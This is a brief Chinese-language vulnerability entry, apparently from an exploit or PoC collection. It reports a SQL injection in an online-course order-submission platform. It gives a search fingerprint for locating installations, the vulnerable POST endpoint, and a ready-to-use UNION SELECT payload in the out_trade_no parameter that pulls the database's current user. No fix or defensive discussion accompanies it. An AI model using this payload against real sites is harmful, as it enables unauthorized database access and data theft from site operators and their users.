# 网课交单平台存在SQL注入漏洞

网课交单平台 ｜ SQL注入 ｜ —
- **指纹**：`"/apisub.php"`
- **请求**：`POST /epay/epay.php HTTP/1.1`

**Payload**
```
out_trade_no=' UNION ALL SELECT 1,CONCAT(IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),3,4,5,6,7,8,9,10,11,12,13-- -
```